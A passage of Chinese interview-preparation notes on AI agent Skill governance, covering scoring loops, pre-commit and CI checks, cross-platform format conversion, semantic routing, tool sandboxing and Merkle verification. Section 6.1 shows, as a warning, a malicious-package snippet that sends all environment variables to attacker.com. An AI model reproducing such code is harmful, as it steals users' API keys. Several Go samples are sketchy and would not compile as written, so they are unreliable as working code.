      - version_stability: "版本稳定性"
```

**Go 代码示例**：

```go
// Score 计算引擎
type ScoreEngine struct {
    weights map[string]float64
}

type ScoreResult struct {
    Overall      float64
    Dimensions   map[string]DimensionScore
    Suggestions  []string // 改进建议
}

type DimensionScore struct {
    Score   float64
    Metrics map[string]float64
}

func (e *ScoreEngine) Calculate(skill *Skill) (*ScoreResult, error) {
    result := &ScoreResult{
        Dimensions: make(map[string]DimensionScore),
    }
    
    var totalScore float64
    
    for dimName, dimConfig := range e.weights {
        dimScore, err := e.evaluateDimension(skill, dimName, dimConfig)
        if err != nil {
            return nil, err
        }
        
        result.Dimensions[dimName] = dimScore
        totalScore += dimScore.Score * dimConfig.Weight
        
        // 生成改进建议
        result.Suggestions = append(result.Suggestions, 
            e.generateSuggestions(dimName, dimScore)...)
    }
    
    result.Overall = totalScore
    return result, nil
}

func (e *ScoreEngine) evaluateDimension(skill *Skill, dimName string, config *DimensionConfig) (DimensionScore, error) {
    switch dimName {
    case "correctness":
        return e.evaluateCorrectness(skill)
    case "completeness":
        return e.evaluateCompleteness(skill)
    case "efficiency":
        return e.evaluateEfficiency(skill)
    case "safety":
        return e.evaluateSafety(skill)
    case "maintainability":
        return e.evaluateMaintainability(skill)
    default:
        return DimensionScore{}, fmt.Errorf("unknown dimension: %s", dimName)
    }
}
```

**Step 2: Improve（改进）**

**解决的问题**：基于评分结果优化 Skill

**改进策略**：

```go
// Improve 决策引擎
type ImproveEngine struct {
    refiner      *NativeThinkingEngine
    elevater     *LogicElevationEngine
    llm          LLM
}

func (ie *ImproveEngine) GenerateImprovements(skill *Skill, score *ScoreResult) ([]Improvement, error) {
    var improvements []Improvement
    
    // 基于评分生成改进建议
    for dimName, dimScore := range score.Dimensions {
        if dimScore.Score < 0.7 { // 低于 70% 分需要改进
            switch dimName {
            case "correctness":
                // 使用 Native Thinking 改进清晰度
                imp, err := ie.improveClarity(skill)
                if err == nil {
                    improvements = append(improvements, *imp)
                }
                
            case "efficiency":
                // 使用 Logic Elevation 优化结构
                imp, err := ie.improveEfficiency(skill)
                if err == nil {
                    improvements = append(improvements, *imp)
                }
            }
        }
    }
    
    return improvements, nil
}
```

**Step 3: Verify（验证）**

**解决的问题**：验证改进是否真的有效

**验证方法**：

```go
// Verify 验证引擎
type VerifyEngine struct {
    testSuite *TestSuite
    llm       LLM
}

type VerificationResult struct {
    Passed   bool
    TestsRun int
    TestsPassed int
    Failures []TestFailure
}

func (ve *VerifyEngine) Run(skill *Skill, improvements []Improvement) (*VerificationResult, error) {
    // 1. 生成测试用例
    tests := ve.generateTests(skill, improvements)
    
    // 2. 运行测试
    var result VerificationResult
    result.TestsRun = len(tests)
    
    for _, test := range tests {
        passed, err := ve.runTest(skill, test)
        if err != nil {
            result.Failures = append(result.Failures, TestFailure{
                Test:     test,
                Error:    err.Error(),
            })
            continue
        }
        
        if passed {
            result.TestsPassed++
        } else {
            result.Failures = append(result.Failures, TestFailure{
                Test:   test,
                Reason: "assertion failed",
            })
        }
    }
    
    result.Passed = result.TestsPassed == result.TestsRun
    return &result, nil
}
```

**Step 4: Keep or Revert（保留或回退）**

**解决的问题**：决定改进是否应该生效

**决策逻辑**：

```go
// Keep or Revert 决策
func GovernanceDecision(verifyResult *VerificationResult, scoreResult *ScoreResult) Decision {
    // 规则 1：验证必须全部通过
    if !verifyResult.Passed {
        return DecisionRevert
    }
    
    // 规则 2：总分必须有提升
    if scoreResult.Overall < scoreResult.PreviousOverall {
        return DecisionRevert
    }
    
    // 规则 3：核心维度不能退化
    criticalDims := []string{"safety", "correctness"}
    for _, dim := range criticalDims {
        if scoreResult.Dimensions[dim].Score < 
           scoreResult.PreviousDimensions[dim].Score {
            return DecisionRevert
        }
    }
    
    return DecisionKeep
}
```

#### 面试追问方向

**追问 1**：Karpathy 模式中的「Repeat」会不会导致无限循环？

**回答框架**：
```
确实存在无限循环的风险，需要退出条件：

退出条件设计：
1. 分数收敛
   - 连续 3 次迭代，分数提升 < 0.1%
   - 认为是「局部最优」，停止迭代
   
2. 分数退化
   - 本次迭代分数低于前 2 次
   - 回退到最佳版本，停止迭代
   
3. 迭代次数上限
   - 最多迭代 10 次
   - 防止无限运行

4. 时间限制
   - 最多运行 30 分钟
   - 防止占用过多资源

实际实现中，建议：
- 人工介入点：每 5 次迭代暂停一次，让人工审核
- 版本快照：每次迭代保存完整快照，可以随时回退
- 渐进策略：先用简单规则优化，再用 LLM 深度优化
```

---

### 4.2 Pre-commit Hooks 强制执行

#### 问题背景：提交前的质量门禁

在团队协作中，Skill 可能被多人修改。如果某人在提交时写了低质量的 Skill，会影响整个团队。

**解决方案**：Pre-commit Hooks，在提交前自动检查。

#### 钩子检查项

**Token Budget 检查**

**解决的问题**：防止 Skill 消耗过多上下文

```yaml
# Token 预算规则
rules:
  token_budget:
    max_l1: 5000      # L1 (SKILL.md) 最多 5000 tokens
    max_l2_total: 10000  # L2 (doctrines/) 最多 10000 tokens
    max_l3_per_file: 5000  # L3 (references/) 每个文件最多 5000 tokens
    
check_logic: |
  1. 解析 SKILL.md，计算 L1 token 数
  2. 遍历 doctrines/，累加 L2 token 数
  3. 遍历 references/，检查每个文件 token 数
  4. 任何一项超限 → 拒绝提交
```

**Frontmatter 检查**

```yaml
# Frontmatter 完整性规则
rules:
  frontmatter:
    required_fields:
      - name
      - description
      - version
      - triggers
      - allowed-tools
    optional_fields:
      - author
      - tags
      - language
      
check_logic: |
  1. 解析 YAML frontmatter
  2. 检查所有 required_fields 是否存在
  3. 验证字段格式：
     - name: kebab-case
     - version: semver
     - triggers: 非空数组
     - allowed-tools: 非空数组
  4. 任何检查失败 → 拒绝提交
```

**引用完整性检查**

```yaml
# 引用完整性规则
rules:
  reference_integrity:
    check:
      - "@ref: 标记的文件是否存在"
      - "scripts/ 中引用的脚本是否存在"
      - "外部 URL 是否可访问（可选，可配置）"
      
check_logic: |
  1. 扫描 SKILL.md 和 doctrines/ 中的引用
  2. 解析 @ref: xxx 格式的引用
  3. 检查引用路径是否在 references/ 下存在
  4. 检查引用的脚本是否存在且可执行
  5. 任何引用失效 → 拒绝提交
```

**隔离性检查**

```yaml
# 隔离性规则
rules:
  isolation:
    description: "确保 Skill 不依赖未声明的外部资源"
    checks:
      - "检查是否有硬编码的绝对路径"
      - "检查是否有未声明的环境变量"
      - "检查是否有硬编码的 API URL"
      - "检查是否有未声明的 Tool 依赖"
```

**Prose 质量检查**

```yaml
# 写作质量规则
rules:
  prose_quality:
    checks:
      - "检查是否有拼写错误"
      - "检查是否有未定义的缩写"
      - "检查命令式语气是否一致（使用 shall/should/must）"
      - "检查段落是否过长（建议 < 5 行）"
      - "检查代码块是否有语言标注"
```

#### Go 代码实现

```go
// Pre-commit Hook 实现
type PreCommitHook struct {
    checker *SkillChecker
}

func (h *PreCommitHook) Run(path string) error {
    skill, err := LoadSkill(path)
    if err != nil {
        return fmt.Errorf("failed to load skill: %w", err)
    }
    
    // 并行运行所有检查
    var wg sync.WaitGroup
    results := make(chan *CheckResult, len(checks))
    
    for _, check := range h.getChecks() {
        wg.Add(1)
        go func(c Check) {
            defer wg.Done()
            result := c.Run(skill)
            results <- result
        }(check)
    }
    
    wg.Wait()
    close(results)
    
    // 汇总结果
    var errors []error
    for result := range results {
        if !result.Passed {
            errors = append(errors, result.Error)
        }
    }
    
    if len(errors) > 0 {
        return &HookError{
            Message: "Pre-commit checks failed",
            Errors:  errors,
        }
    }
    
    return nil
}

// 安装 Hook
func InstallHook(repoPath string) error {
    hookContent := `#!/bin/bash
# Pre-commit hook for Skill Governance
# Auto-generated, do not edit manually

SKILL_PATH=$(git rev-parse --show-toplevel)

# Run skill-check
if ! skill-check --path "$SKILL_PATH"; then
    echo "Skill check failed. Fix errors before committing."
    exit 1
fi
`
    
    hookPath := filepath.Join(repoPath, ".git", "hooks", "pre-commit")
    return os.WriteFile(hookPath, []byte(hookContent), 0755)
}
```

---

### 4.3 CI/CD 集成

#### 问题背景：自动化质量保障

团队中可能有人跳过 pre-commit hook（`git commit --no-verify`），或者 pre-commit hook 在其他开发者机器上没安装。

**解决方案**：CI/CD 中强制运行检查。

#### CI/CD 流水线设计

```yaml
# .github/workflows/skill-ci.yml
name: Skill Quality CI

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  skill-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        
      - name: Install skill-check
        run: npm install -g skill-governance
        
      - name: Run skill-check
        run: |
          skill-check --path . --format json --output report.json
          
      - name: Upload report
        uses: actions/upload-artifact@v4
        with:
          name: skill-report
          path: report.json
          
      - name: Fail on critical issues
        run: |
          # 检查是否有关键问题
          if grep -q '"severity": "critical"' report.json; then
            echo "Critical issues found, failing build"
            exit 1
          fi

  skill-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        
      - name: Install dependencies
        run: npm install
        
      - name: Run security audit
        run: |
          skill-audit --scan-references --scan-dependencies
          
      - name: Check for outdated references
        run: |
          skill-audit --check-outdated \
            --max-age 90d \
            --fail-on: broken_links, deprecated_api
```

#### 面试追问方向

**追问 1**：Pre-commit Hook 和 CI/CD 有什么分工？

**回答框架**：
```
两层检查的分工：

Pre-commit Hook（开发时）
- 目的：快速反馈，即时发现
- 优点：开发者立即知道问题
- 缺点：可能被跳过
- 适用：轻量检查（格式、token 限制）

CI/CD（提交后）
- 目的：强制门禁，不可绕过
- 优点：100% 执行，分支保护
- 缺点：需要等流水线运行
- 适用：重量检查（安全扫描、性能测试）

配合策略：
1. Pre-commit：只做快速检查（< 5 秒）
   - 格式检查
   - Token 预算
   - Frontmatter 完整性
   
2. CI/CD：做完整检查（可能 5-10 分钟）
   - 安全扫描
   - 功能测试
   - 性能基准

原则：
- Pre-commit 越快越好，避免阻断开发流
- CI/CD 做「必须做但可以等」的事
```

---

## 5. Skill Kit 与跨 Agent 生态

### 5.1 32 种 Agent 格式转换的工程挑战

#### 问题背景：Agent 平台碎片化

目前主流的 AI 编码 Agent：

| 平台 | 格式 | 配置文件 | Skill 定义方式 |
|------|------|----------|---------------|
| Claude Code | Claude Code 格式 | `.claude` 目录 | `.md` |
| Cursor | `.cursor` 格式 | `.cursor/rules/` | `.mdc` |
| Windsurf | Cascade 格式 | `.windsurfrules` | YAML |
| Codex CLI | Codex 格式 | `~/.codex/` | JSON |
| GitHub Copilot | Copilot 格式 | `.github/copilot-instructions.md` | Markdown |
| Gemini CLI | Gemini 格式 | `~/.gemini/` | YAML |
| Roo Code | Roo 格式 | `.roo/` | Markdown |

**问题**：每个平台的 Skill 格式不同，一个 Skill 无法直接跨平台使用。

#### 格式转换的技术挑战

**挑战一：语义等价转换**

不同格式的语义表达能力不同：

```
Claude Code 格式：
---
name: code-review
---

你是专业的代码审查员...

Cursor .mdc 格式：
---
skill:
  name: code-review
  description: "..."
---

你是专业的代码审查员...

问题：两个格式的「description」字段语义不完全等价
- Claude Code：description 只是元信息
- Cursor：description 可能影响 Agent 的系统 Prompt
```

**挑战二：功能特性不兼容**

某些格式有独特功能：

```
Cursor .mdc 特殊功能：
- glob 模式：只对匹配的文件生效
  ```yaml
  globs:
    - "**/*.py"
  ```
  
Claude Code 没有等效功能，如何转换？
- 选项 A：放弃 glob，在 SKILL.md 中手动过滤
- 选项 B：在 L1 层添加「仅在 .py 文件时激活」的判断逻辑
```

**挑战三：Tool 定义差异**

```yaml
# Claude Code Tool 定义
tools:
  - name: Read
    description: "Read file contents"
    
# Cursor Tool 定义
tools:
  - Read:
      description: "Read file contents"
      parameters:
        file_path: string

# Windsurf Tool 定义
tools:
  - type: function
    function:
      name: read_file
      description: "Read file contents"
```

Tool 名称、参数格式都不同，需要标准化抽象层。

#### 技术实现：格式转换抽象

```go
// Agent 格式抽象
type AgentSkill interface {
    // 格式标识
    Format() string
    
    // 解析
    Parse(content []byte) (*Skill, error)
    
    // 序列化
    Serialize(skill *Skill) ([]byte, error)
}

// 格式注册表
type FormatRegistry struct {
    formats map[string]AgentSkill
    mu      sync.RWMutex
}

func (r *FormatRegistry) Register(format string, skill AgentSkill) {
    r.mu.Lock()
    defer r.mu.Unlock()
    r.formats[format] = skill
}

func (r *FormatRegistry) Get(format string) (AgentSkill, error) {
    r.mu.RLock()
    defer r.mu.RUnlock()
    
    skill, ok := r.formats[format]
    if !ok {
        return nil, fmt.Errorf("unsupported format: %s", format)
    }
    return skill, nil
}

// 转换器
type SkillConverter struct {
    registry *FormatRegistry
    normalizer *SkillNormalizer // 标准化中间格式
}

func (c *SkillConverter) Convert(skill *Skill, targetFormat string) ([]byte, error) {
    // Step 1: 转换为标准化格式
    normalized := c.normalizer.Normalize(skill)
    
    // Step 2: 获取目标格式
    target, err := c.registry.Get(targetFormat)
    if err != nil {
        return nil, err
    }
    
    // Step 3: 序列化为目标格式
    return target.Serialize(normalized)
}

// 标准化中间格式
type NormalizedSkill struct {
    Name        string
    Description string
    Version     string
    Triggers    []string
    Instructions string
    AllowedTools []string
    Doctrines   []Doctrine
    References  []Reference
}
```

#### 面试追问方向

**追问 1**：32 种格式转换如何保证质量？会不会转换后语义丢失？

**回答框架**：
```
质量保证策略：

1. 测试用例覆盖
   - 为每种格式准备「黄金测试用例」
   - 转换前 → 转换后 → 比较语义等价性

2. 语义等价性验证
   - 转换后的 Skill 在目标平台执行
   - 与源 Skill 的执行结果对比
   - 关键指标：任务完成率、输出质量

3. 渐进式支持
   - 第一阶段：支持最流行的 5 种格式（Claude Code, Cursor, Windsurf, Codex, Copilot）
   - 第二阶段：支持其他 10 种
   - 第三阶段：支持剩余格式

4. 人工审核
   - 高风险转换（涉及安全、权限）需要人工确认
   - 提供「diff」视图，让用户审查转换结果

5. 降级策略
   - 无法完美转换时，提供警告
   - 建议用户手动调整关键部分
```

---

### 5.2 语义路由原理

#### 问题背景：Skill 与 Task 的自动匹配

用户说一句话，如何知道应该用哪个 Skill？

**简单方案：关键词匹配**
```
用户：「审查代码」
匹配：「代码审查 Skill」（trigger 包含「审查」）

问题：
- 「代码审查」和「代码重构」都包含「代码」
- 两者都会匹配
- 如何选择？
```

**进阶方案：语义路由**

语义路由的核心思想：**计算用户意图与 Skill 的语义相似度**

#### 技术实现

```go
// 语义路由引擎
type SemanticRouter struct {
    embeddingModel EmbeddingModel
    skillIndex     *SkillIndex
    threshold      float64 // 相似度阈值
}

type RoutingResult struct {
    Skill     *Skill
    Score     float64
    Reasoning string
}

func (r *SemanticRouter) Route(ctx context.Context, userInput string) (*RoutingResult, error) {
    // Step 1: Embedding 用户输入
    inputEmbedding, err := r.embeddingModel.Embed(ctx, userInput)
    if err != nil {
        return nil, err
    }
    
    // Step 2: 计算与所有 Skill 的相似度
    candidates, err := r.skillIndex.Search(inputEmbedding, topK=5)
    if err != nil {
        return nil, err
    }
    
    // Step 3: 选择最佳匹配
    best := candidates[0]
    
    // Step 4: 如果最高分也低于阈值，返回 nil（需要更多上下文）
    if best.Score < r.threshold {
        return &RoutingResult{
            Skill:     nil,
            Score:     best.Score,
            Reasoning: "No skill matches with sufficient confidence",
        }, nil
    }
    
    // Step 5: 生成推理说明
    reasoning := r.generateReasoning(userInput, best.Skill, best.Score)
    
    return &RoutingResult{
        Skill:     best.Skill,
        Score:     best.Score,
        Reasoning: reasoning,
    }, nil
}

// 推理说明生成
func (r *SemanticRouter) generateReasoning(input string, skill *Skill, score float64) string {
    // 分析为什么这个 Skill 被选中
    matchedTriggers := []string{}
    for _, trigger := range skill.Triggers {
        if similarity(input, trigger) > 0.6 {
            matchedTriggers = append(matchedTriggers, trigger)
        }
    }
    
    return fmt.Sprintf(
        "Matched '%s' (confidence: %.2f) because input is similar to triggers: %s",
        skill.Name,
        score,
        strings.Join(matchedTriggers, ", "),
    )
}
```

#### 面试追问方向

**追问 1**：语义路由和传统的意图识别有什么不同？

**回答框架**：
```
意图识别 vs 语义路由：

意图识别（Intent Recognition）：
- 目标：分类用户意图
- 输出：「用户想要代码审查」
- 方法：训练分类器，预测意图类别

语义路由（Semantic Routing）：
- 目标：选择最合适的 Skill
- 输出：「应该用 code-review Skill」
- 方法：计算语义相似度

关键区别：
| 维度 | 意图识别 | 语义路由 |
|------|----------|----------|
| 输入 | 用户话语 | 用户话语 |
| 输出 | 意图类别 | Skill 对象 |
| 粒度 | 粗（10-50 类） | 细（可能数千个 Skill） |
| 更新方式 | 重新训练 | 更新 Embedding 索引 |
| 计算成本 | 训练成本高，推理低 | 无训练，推理需 Embedding |

实际应用中，两者可以结合：
- 意图识别：快速分类（审查/重构/文档）
- 语义路由：在分类内精细选择（哪个审查 Skill？）
```

---

## 6. 安全与完整性

### 6.1 零执行完整性：Skills 作为数据而非脚本

#### 问题背景：Skill 的安全风险

传统软件包（npm、pip）可以包含可执行脚本：

```javascript
// malicious-package/index.js
// 这个文件可能在 npm install 时执行恶意代码
const fs = require('fs');
const os = require('os');

// 窃取环境变量（包含 API Key）
const env = JSON.stringify(process.env);
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: env
});
```

**问题**：如果 Skill 也允许包含可执行脚本，会面临同样的风险。

#### 零执行完整性的设计

**核心理念**：Skill 的内容是「数据」，不是「代码」

```
传统脚本执行流程：
Skill 文件 → 操作系统执行 → 可能修改文件、发送网络请求

零执行流程：
Skill 内容 → LLM 解析 → LLM 决定调用哪些 Tool → Tool 执行
                            ↑
                     Tool 是白名单
```

**白名单 Tool 机制**：

```yaml
# SKILL.md 零执行配置
allowed-tools:
  - type: read
    scope: ["${SKILL_PATH}/references/**", "${WORKSPACE}/**"]
    restrictions:
      max_file_size: 1MB
      
  - type: bash
    scope: ["npm test", "go test"]
    restrictions:
      timeout: 30s
      env_blacklist: ["API_KEY", "SECRET"]
      
  - type: write
    scope: ["${WORKSPACE}/**"]
    restrictions:
      allowed_extensions: [".md", ".txt", ".json"]
```

**Go 代码示例**：

```go
// 零执行安全沙箱
type ZeroExecutionSandbox struct {
    allowedTools map[string]*ToolConfig
    auditLog     *AuditLogger
}

type ToolConfig struct {
    Type         string
    Scope        []string  // 允许的操作范围
    Restrictions *Restrictions
}

func (s *ZeroExecutionSandbox) Execute(toolName string, args map[string]interface{}) (interface{}, error) {
    config, ok := s.allowedTools[toolName]
    if !ok {
        return nil, fmt.Errorf("tool '%s' is not allowed", toolName)
    }
    
    // 检查范围
    if err := s.validateScope(toolName, args, config); err != nil {
        s.auditLog.Log("BLOCKED", toolName, args, err)
        return nil, err
    }
    
    // 记录审计日志
    s.auditLog.Log("ALLOWED", toolName, args, nil)
    
    // 执行工具
    return s.tools[toolName].Execute(args)
}

func (s *ZeroExecutionSandbox) validateScope(toolName string, args map[string]interface{}, config *ToolConfig) error {
    switch toolName {
    case "read":
        path := args["path"].(string)
        if !s.isInScope(path, config.Scope) {
            return fmt.Errorf("path '%s' is not in allowed scope", path)
        }
        
    case "bash":
        cmd := args["command"].(string)
        if !s.isCommandAllowed(cmd, config.Scope) {
            return fmt.Errorf("command '%s' is not in allowed commands", cmd)
        }
        
    case "write":
        path := args["path"].(string)
        if !s.isInScope(path, config.Scope) {
            return fmt.Errorf("path '%s' is not in allowed scope", path)
        }
    }
    
    return nil
}
```

#### 面试追问方向

**追问 1**：零执行完整性会影响 Skill 的能力吗？

**回答框架**：
```
零执行完整性的权衡：

限制能力：
- Skill 不能直接执行任意脚本
- 需要预先定义允许的 Tool

保持能力：
- 99% 的 Skill 场景不需要执行任意脚本
- 预定义的 Tool 集合（文件操作、API 调用、测试）足够

实际案例：
Skill: "自动化测试生成"
├→ 读取源代码 ✓（read Tool）
├→ 生成测试代码 ✓（LLM 生成）
├→ 运行测试 ✓（bash Tool，限制为 "npm test"）
└→ 查看测试结果 ✓（read Tool）

整个流程不需要「任意脚本执行」，零执行不限制这个 Skill 的能力

结论：零执行完整性在保护安全的同时，对正常使用影响极小。
```

---

### 6.2 Merkle 哈希验证原理

#### 问题背景：内容篡改检测

Skill 发布后，可能被恶意篡改：
- 中间人攻击修改内容
- 恶意节点替换 Skill
- 供应链攻击

**解决方案**：Merkle 哈希树

#### Merkle 哈希原理

```
Merkle 哈希树结构：

                    Root Hash (A)
                   /             \
            Hash(B)                Hash(C)
           /      \               /      \
      Hash(D)  Hash(E)      Hash(F)   Hash(G)
         |        |             |         |
        "d1"     "d2"          "d3"     "d4"
        
验证 "d2" 的完整性：
1. 获取 "d2"
2. 计算 Hash("d2") = E
3. 获取 Hash(D) 和 Root Hash
4. 计算 Hash(Hash(D), Hash("d2"))
5. 与 Root Hash 对比
```

#### Skill 的 Merkle 验证实现

```go
// Merkle 哈希验证
type MerkleVerifier struct {
    hashFunc crypto.Hash
}

func (v *MerkleVerifier) BuildTree(files map[string][]byte) (*MerkleTree, error) {
    // Step 1: 计算每个文件的哈希
    leaves := make([][]byte, 0, len(files))
    paths := make([]string, 0, len(files))
    
    for path, content := range files {
        hash := v.hashContent(content)
        leaves = append(leaves, hash)
        paths = append(paths, path)
    }
    
    // Step 2: 构建树
    tree := v.buildTree(leaves)
    
    return &MerkleTree{
        Root:     tree.Root,
        Paths:    paths,
        TreeData: tree,
    }, nil
}

func (v *MerkleVerifier) Verify(tree *MerkleTree, path string, content []byte) (bool, error) {
    // Step 1: 找到文件在树中的位置
    idx := -1
    for i, p := range tree.Paths {
        if p == path {
            idx = i
            break
        }
    }
    
    if idx == -1 {
        return false, fmt.Errorf("path not found in tree: %s", path)
    }
    
    // Step 2: 计算文件哈希
    fileHash := v.hashContent(content)
    
    // Step 3: 验证到根
    proof := tree.GetProof(idx)
    root, err := v.VerifyProof(proof, fileHash)
    if err != nil {
        return false, err
    }
    
    // Step 4: 对比根哈希
    return bytes.Equal(root, tree.Root), nil
}

// 安装验证命令
func (m *MerkleVerifier) Doctor(skillPath string) error {
    // 读取本地的 Merkle 树（发布时生成）
    treeFile := filepath.Join(skillPath, ".skill", "merkle.json")
    treeData, err := os.ReadFile(treeFile)
    if err != nil {
        return fmt.Errorf("Merkle tree not found. Run 'skill-install' first.")
    }
    
    var tree MerkleTree
    if err := json.Unmarshal(treeData, &tree); err != nil {
        return err
    }
    
    // 逐个验证文件
    skill, err := LoadSkill(skillPath)
    if err != nil {
        return err
    }
    
    for _, file := range skill.AllFiles() {
        content, err := os.ReadFile(file)
        if err != nil {
            return fmt.Errorf("failed to read %s: %w", file, err)
        }
        
        valid, err := m.Verify(&tree, file, content)
        if err != nil {
            return fmt.Errorf("verification error for %s: %w", file, err)
        }
        
        if !valid {
            return fmt.Errorf("CONTENT TAMPERED: %s", file)
        }
    }
    
    return nil // 所有文件验证通过
}
```

---

## 7. 与 InterviewPro 的关联分析

### 7.1 InterviewPro 的 Go 后端引入 Skill 架构

#### 当前架构分析

InterviewPro 的 Go 后端目前采用传统的分层架构：

```
InterviewPro 架构（简化）
┌─────────────────────────────────────────────────────────────┐
│                      API Layer (HTTP)                       │
├─────────────────────────────────────────────────────────────┤
│                      Service Layer                           │
│   ├→ InterviewService（面试流程管理）                        │
│   ├→ QuestionService（题目管理）                           │
│   ├→ EvaluationService（评测服务）                          │
│   └→ AudioService（音频处理）                               │
├─────────────────────────────────────────────────────────────┤
│                      Model Layer                             │
│   ├→ InterviewModel（面试模型选择）                         │
│   └→ EvalModel（评测模型选择）                              │
├─────────────────────────────────────────────────────────────┤
│                      Storage Layer (MongoDB)                 │
└─────────────────────────────────────────────────────────────┘
```

#### Skill 化改造方案

**方案一：AI Service 层 Skill 化**

```go
// 当前：ModelFactory 模式
type ModelFactory struct {
    models map[string]LLM
}

func (f *ModelFactory) GetModel(name string) (LLM, error) {
    if model, ok := f.models[name]; ok {
        return model, nil
    }
    return nil, fmt.Errorf("model not found: %s", name)
}

// Skill 化改造
type SkillRegistry struct {
    skills map[string]*AISkill
}

type AISkill struct {
    Name        string
    Description string
    Triggers    []string
    Executor    SkillExecutor
    Config      SkillConfig
}

// 注册面试相关 Skill
func (r *SkillRegistry) RegisterInterviewSkills() {
    // 代码分析 Skill
    r.Register(&AISkill{
        Name:        "code-analysis",
        Description: "分析用户代码的技术实现",
        Triggers:    []string{"分析代码", "代码审查", "看看这段代码"},
        Executor:    NewCodeAnalysisExecutor(),
        Config: SkillConfig{
            Model:       "gpt-4",
            MaxTokens:   2000,
            Temperature: 0.3,
        },
    })
    
    // 追问生成 Skill
    r.Register(&AISkill{
        Name:        "followup-generation",
        Description: "基于用户回答生成追问",
        Triggers:    []string{"生成追问", "继续问", "追问"},
        Executor:    NewFollowupExecutor(),
        Config: SkillConfig{
            Model:       "gpt-4",
            MaxTokens:   500,
            Temperature: 0.7,
        },
    })
}
```

**方案二：评测流程 Skill 化**

```go
// 当前：硬编码的评测流程
func EvaluateAnswer(ctx context.Context, answer string) (*EvalResult, error) {
    // 1. 检查语法
    syntaxOk := checkSyntax(answer)
    
    // 2. 检查逻辑完整性
    logicScore := evaluateLogic(answer)
    
    // 3. 检查技术准确性
    accuracyScore := evaluateAccuracy(answer)
    
    // 4. 生成反馈
    feedback := generateFeedback(...)
    
    return &EvalResult{...}, nil
}

// Skill 化改造
type EvaluationSkill struct {
    baseAISkill *AISkill
    strategies  map[string]*EvalStrategy
}

type EvalStrategy struct {
    Dimension string
    Check     func(answer string) (float64, string)
    Weight    float64
}

func (s *EvaluationSkill) Execute(ctx context.Context, input *EvalInput) (*EvalResult, error) {
    // 1. 选择适用的策略
    strategies := s.selectStrategies(input.QuestionType)
    
    // 2. 并行执行各项检查
    var wg sync.WaitGroup
    results := make(chan *DimensionResult, len(strategies))
    
    for _, strategy := range strategies {
        wg.Add(1)
        go func(st *EvalStrategy) {
            defer wg.Done()
            score, feedback := st.Check(input.Answer)
            results <- &DimensionResult{
                Dimension: st.Dimension,
                Score:     score,
                Feedback:  feedback,
            }
        }(strategy)
    }
    
    wg.Wait()
    close(results)
    
    // 3. 聚合结果
    return s.aggregateResults(results), nil
}
```

### 7.2 对面试准备的直接价值

#### 作为 AI Agent 开发工程师面试的核心知识点

**面试中的 Skill 相关问题预测**：

```
高频问题类型：

1. 概念理解
   - Skill 和 Tool 的区别是什么？
   - 为什么需要 Skill 模块化？
   - SKILL.md 标准的优势是什么？

2. 设计原理
   - 渐进式披露架构解决什么问题？
   - CoT 重构为什么能提高成功率？
   - Token 预算如何设定？

3. 工程实践
   - 如何设计一个 Skill？
   - Skill 质量如何评估？
   - 如何做 Skill 的版本管理？

4. 系统设计
   - 如何设计 Skill 注册发现机制？
   - 如何实现 Skill 的跨平台兼容？
   - Skill 的安全性如何保障？
```

#### 面试回答示范

**问题**：请解释 SKILL.md 的渐进式披露架构

**回答示范**：

```
渐进式披露是解决「上下文窗口有限」问题的分层加载机制。

背景：
LLM 的上下文窗口虽然大，但实际使用中存在「中间丢失效应」——模型对上下文中段的信息召回率显著低于首尾。此外，token 成本是线性计费的，上下文越长成本越高。

解决方案：
三层架构，L1 → L2 → L3 渐进加载。

L1 (SKILL.md)：
始终加载，包含 Frontmatter 和核心指令，约 100-5000 tokens。
用于快速判断 Skill 是否适用，以及最常用的执行逻辑。

L2 (doctrines/)：
按需加载，只在特定上下文下激活。
例如：Python 开发者激活 python-style.md，Go 开发者激活 go-concurrency.md。
避免加载不需要的规则。

L3 (references/)：
显式引用时加载，用于大体积参考文档。
例如：@ref:api-docs/openapi.json#/paths/users
只加载被引用的部分，不全文加载。

类比：
这就像一本技术书籍——封面和目录（L1）始终可见，
章节导言（L2）在阅读该章节时显示，
详细内容（L3）在明确引用时翻到对应页。
```

---

## 8. 面试高频问答

### 问题 1：Skill 和 Tool 的核心区别是什么？

**问题解析**：
这是最基础的概念题，考察对 Agent 架构的理解深度。

**回答框架**：

```
核心区别体现在四个维度：

1. 粒度
   - Tool：原子操作，输入→输出，不包含策略
   - Skill：复合能力，包含策略和决策逻辑

2. 状态
   - Tool：无状态，每次调用独立
   - Skill：有状态，维护执行上下文

3. 决策
   - Tool：不做决策，只是执行
   - Skill：包含 LLM 决策，何时调用什么 Tool

4. 组合
   - Tool：需要外部编排器组合
   - Skill：自我组合，内部决定执行流程

生活类比：
- Tool = 扳手、螺丝刀（单一功能）
- Skill = 修理工的专业技能（判断问题→选择工具→执行→验证）

代码示例（Go）：
```go
// Tool：只做一件事
func ReadFile(path string) (string, error) {
    return os.ReadFile(path)
}

// Skill：包含策略和决策
type CodeReviewSkill struct {
    tools []Tool
}

func (s *CodeReviewSkill) Review(path string) (*Report, error) {
    // Skill 自己决定执行顺序和策略
    code, _ := s.tools[0].Execute(path)  // 先读文件
    issues := s.analyze(code)             // 再分析（Skill 决策）
    return s.generateReport(issues), nil
}
```
```

**追问准备**：
- 什么时候只用 Tool 不用 Skill？（简单任务、确定性操作）
- Skill 能否完全替代 Tool？（不能，Skill 内部还是调用 Tool）

---

### 问题 2：CoT（Chain of Thought）为什么能提高 Agent 成功率？

**问题解析**：
考察对 LLM 推理机制的理解，以及 Prompt 工程的深度。

**回答框架**：

```
CoT 提高成功率的三个原理：

1. 注意力锚定
LLM 的注意力有「首尾偏见」，中间部分容易被忽略。
CoT 将任务分解为多个步骤，每一步都是「锚点」，
保证 LLM 在每个阶段都聚焦当前任务。

2. 中间结果约束
步骤之间有逻辑依赖。
如果 Step 1 发现了 X，Step 2 必须处理 X。
防止 LLM「选择性忽略」问题。

3. 输出结构化
强制输出结构化结果，便于验证和评估。
非结构化输出难以自动化检查。

量化数据（Skill Refiner 测试）：
- 任务完成率：62% → 89% (+27%)
- 错误率：23% → 8% (-15%)

代价：
- Token 消耗增加 2-3 倍
- 执行时间略长
但换来的可靠性提升是值得的。

代码示例：
```go
// 无 CoT
prompt := "审查这段代码"

// CoT
prompt := `审查这段代码。按照以下步骤：
1. 正确性检查 → 报告发现的问题
2. 安全性检查 → 报告发现的问题
